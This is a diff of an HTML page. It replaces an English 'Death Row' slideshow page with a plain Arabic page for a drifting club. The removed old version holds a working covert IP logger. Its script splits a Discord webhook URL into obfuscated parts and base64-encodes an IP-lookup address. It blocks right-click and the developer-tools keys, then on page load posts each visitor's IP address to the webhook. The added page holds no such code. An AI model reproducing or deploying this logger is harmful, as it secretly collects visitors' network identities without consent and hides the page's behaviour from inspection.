@@ -1,266 +1,117 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Death Row</title>
-    <link rel="icon" href="305.jpg" type="image/png"> <!-- PNG Favicon link -->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>درب الموت</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #000000; /* Black background */
-            color: #ffffff; /* White text color */
+            font-family: 'Arial', sans-serif;
             margin: 0;
             padding: 0;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            position: relative;
+            background-color: #1a1a1a;
+            color: white;
+            text-align: center;
         }
-        .header, .footer {
-            font-family: 'Creepster', cursive; /* Bloody font */
-        }
-        .header {
-            font-size: 3em;
-            margin-top: 20px;
-            color: #ff0000; /* Red color for a bloody effect */
-        }
-        .slideshow-container {
-            max-width: 800px;
-            position: relative;
-        }
-        .mySlides {
-            display: none;
-        }
-        .slideshow-container img {
-            width: 100%;
-        }
-        .footer {
-            font-size: 1.5em;
-            margin-top: 20px;
-            width: 100%;
-            white-space: nowrap;
-            overflow: hidden;
-            position: fixed;
-            bottom: 10px;
-            left: 0;
-            color: #ffffff; /* White color for the footer text */
-        }
-        .footer span {
-            display: inline-block;
-            animation: bounce 4s infinite linear;
-        }
-        @keyframes bounce {
-            0% { transform: translateX(100%); }
-            50% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-        .fade {
-            animation: fadeEffect 1.5s;
-        }
-        @keyframes fadeEffect {
-            from {opacity: .4} 
-            to {opacity: 1}
-        }
-        .embed {
-            border: 2px solid #ffffff; /* White border for the embed */
+
+        header {
+            background-color: #2b2b2b;
             padding: 20px;
-            margin: 20px;
-            text-align: left;
-            background-color: #111111; /* Dark background for the embed */
-        }
-        .embed img {
-            display: block;
-            margin: 0 auto 10px;
-        }
-        .social-icons {
-            position: absolute;
-            top: 10px;
-            left: 10px;
             display: flex;
-            gap: 15px;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
         }
-        .social-icons a {
+
+        header h1 {
+            font-size: 48px;
+            margin: 10px 0;
+        }
+
+        header .logo img {
+            display: block;
+            margin: 0 auto;
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            background-color: #333;
+            margin: 0;
+        }
+
+        nav ul li {
+            margin: 0 15px;
+        }
+
+        nav ul li a {
+            color: white;
             text-decoration: none;
+            font-size: 18px;
         }
-        .social-icons img {
-            width: 30px;
-            height: 30px;
+
+        nav ul li a:hover {
+            text-decoration: underline;
         }
-        .gif-container {
-            margin-top: 20px;
+
+        section {
+            padding: 50px 20px;
+        }
+
+        footer {
+            background-color: #2b2b2b;
+            padding: 20px;
+        }
+
+        footer ul {
+            list-style: none;
+            padding: 0;
         }
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
 </head>
-<body oncontextmenu="return false">
-    <div class="social-icons">
-        <a href="https://www.tiktok.com/@avn_" target="_blank">
-            <img src="https://i.pinimg.com/originals/b7/ba/01/b7ba01f5cae341b1dfcdc615a4788f9d.jpg" alt="TikTok">
-        </a>
-        <a href="https://discord.gg/499" target="_blank">
-            <img src="https://i.pinimg.com/originals/5b/da/c5/5bdac50e89b8ed4324a4a7a8f7eb1f77.jpg" alt="Discord">
-        </a>
-        <a href="https://www.instagram.com/368b_" target="_blank">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
-        </a>
-    </div>
-    <div class="slideshow-container">
-        <div class="mySlides fade">
-            <img src="1.gif" alt="GIF 1">
+<body dir="rtl">
+    <header>
+        <div class="logo">
+            <img src="skull.png" alt="Skull Logo" width="100" height="100">
         </div>
-        <div class="mySlides fade">
-            <img src="2.gif" alt="GIF 2">
-        </div>
-        <div class="mySlides fade">
-            <img src="3.gif" alt="GIF 3">
-        </div>
-        <div class="mySlides fade">
-            <img src="4.gif" alt="GIF 4">
-        </div>
-        <div class="mySlides fade">
-            <img src="5.gif" alt="GIF 5">
-        </div>
-        <div class="mySlides fade">
-            <img src="6.gif" alt="GIF 6">
-        </div>
-        <div class="mySlides fade">
-            <img src="7.gif" alt="GIF 7">
-        </div>
-        <div class="mySlides fade">
-            <img src="8.gif" alt="GIF 8">
-        </div>
-        <div class="mySlides fade">
-            <img src="9.gif" alt="GIF 9">
-        </div>
-        <div class="mySlides fade">
-            <img src="10.gif" alt="GIF 10">
-        </div>
-        <div class="mySlides fade">
-            <img src="11.gif" alt="GIF 11">
-        </div>
-        <div class="mySlides fade">
-            <img src="12.gif" alt="GIF 12">
-        </div>
-        <div class="mySlides fade">
-            <img src="13.gif" alt="GIF 13">
-        </div>
-        <div class="mySlides fade">
-            <img src="14.gif" alt="GIF 14">
-        </div>
-        <div class="mySlides fade">
-            <img src="15.gif" alt="GIF 15">
-        </div>
-        <div class="mySlides fade">
-            <img src="16.gif" alt="GIF 16">
-        </div>
-        <div class="mySlides fade">
-            <img src="17.gif" alt="GIF 17">
-        </div>
-    </div>
-    <div class="header">
-        Discord.gg/499
-    </div>
-    <div class="gif-container">
-        <img src="cloudflaer.gif" alt="Your GIF">
-    </div>
-    <div class="footer">
-        <span>Death Row</span>
-    </div>
-    <script>
-        // Obfuscated Discord webhook URL
-        const part1 = "https://canary.discord.com/api/webhooks/";
-        const part2 = "1256247502366314576";
-        const part3 = "/DgNOqdsKDTmfPmoCdccyAVvuTxcX6p9MqqOqGXSKh-wmISkUukuiiS62QRqWfD6i1le1";
-        const webhookURL = part1 + part2 + part3;
+        <h1>درب الموت</h1>
+    </header>
 
-        // Base64 encoded IP fetch URL
-        const ipFetchUrl = atob("aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u");
+    <nav>
+        <ul>
+            <li><a href="#home">الرئيسية</a></li>
+            <li><a href="#drifters">الدرّافترز</a></li>
+            <li><a href="#gallery">المعرض</a></li>
+            <li><a href="#contact">تواصل معنا</a></li>
+        </ul>
+    </nav>
 
-        // Disable right-click
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-        });
+    <section id="home">
+        <h2>مرحبًا بكم في درب الموت</h2>
+        <p>أقوى تجمع لمحبي الدرفت في العالم العربي، حيث الشجاعة والقوة تظهر على الطريق.</p>
+    </section>
 
-        // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, and Ctrl+U
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || 
-                (e.ctrlKey && e.shiftKey && e.key === 'I') || 
-                (e.ctrlKey && e.shiftKey && e.key === 'J') || 
-                (e.ctrlKey && e.key === 'U')) {
-                e.preventDefault();
-            }
-        });
+    <section id="drifters">
+        <h2>أفضل الدرّافترز</h2>
+        <p>استمتع بمشاهدة أفضل المهارات والأداء من أبطال الدرفت العربي.</p>
+    </section>
 
-        let slideIndex = 0;
-        showSlides();
+    <section id="gallery">
+        <h2>معرض الصور</h2>
+        <p>أحدث الصور من أحداث الدرفت والمنافسات.</p>
+        <!-- Gallery images would go here -->
+    </section>
 
-        function showSlides() {
-            let slides = document.getElementsByClassName("mySlides");
-            for (let i = 0; i < slides.length; i++) {
-                slides[i].style.display = "none";  
-            }
-            slideIndex++;
-            if (slideIndex > slides.length) {slideIndex = 1}    
-            slides[slideIndex-1].style.display = "block";  
-            setTimeout(showSlides, 2000); // Change image every 2 seconds
-        }
-
-        function fetchIP() {
-            fetch(ipFetchUrl)
-                .then(response => response.json())
-                .then(data => {
-                    console.log('IP fetched:', data.ip);
-                    sendToDiscord(data.ip);
-                })
-                .catch(error => console.error('Error fetching IP:', error));
-        }
-
-        function fetchName() {
-            const visitorName = "Unknown Visitor"; // Placeholder if no name is available
-            document.getElementById('visitorName').innerText = `Name: ${visitorName}`;
-        }
-
-        function sendToDiscord(ip) {
-            const message = {
-                username: "Death Row",
-                avatar_url: "https://cdn.discordapp.com/attachments/1247389407431098479/1257195010533756980/300b41751a5a000579d9167707ebd7e4.png?ex=66838598&is=66823418&hm=50495049dd54d9ba80b33e0687c38db74711f535ac67b719e48bf2b2a06f43d3&", // Optional: URL to the bot's avatar image
-                embeds: [{
-                    title: "Visitor IP Information",
-                    description: `Visitor IP: ${ip}`,
-                    color: 15258703, // Hex color code as decimal (0xE74C3C)
-                    footer: {
-                        text: "Death Row",
-                        icon_url: "https://cdn.discordapp.com/attachments/1247389407431098479/1257195010533756980/300b41751a5a000579d9167707ebd7e4.png?ex=66838598&is=66823418&hm=50495049dd54d9ba80b33e0687c38db74711f535ac67b719e48bf2b2a06f43d3&"
-                    },
-                    image: {
-                        url: "https://cdn.discordapp.com/attachments/1256064719610183730/1257211351848456242/af50ed15d83254f31fcba9048ab5db67.gif?ex=668394d0&is=66824350&hm=08666be597113f4592b9c1cc7d0f8d9bec01ea9ee239ff0284d18d3727c6f2df&" // URL to your GIF
-                    }
-                }]
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(message)
-            }).then(response => {
-                if (response.ok) {
-                    console.log('Message sent to Discord successfully');
-                } else {
-                    console.error('Error sending message to Discord:', response.statusText);
-                }
-            }).catch(error => console.error('Error sending to Discord:', error));
-        }
-
-        window.onload = function() {
-            fetchIP();
-            fetchName();
-        }
-    </script>
+    <footer id="contact">
+        <h2>تواصل معنا</h2>
+        <p>للمزيد من المعلومات أو للانضمام إلينا، تواصل معنا عبر:</p>
+        <ul>
+            <li>البريد الإلكتروني: info@drabalmot.com</li>
+            <li>الهاتف: 123-456-7890</li>
+        </ul>
+    </footer>
 </body>
 </html>
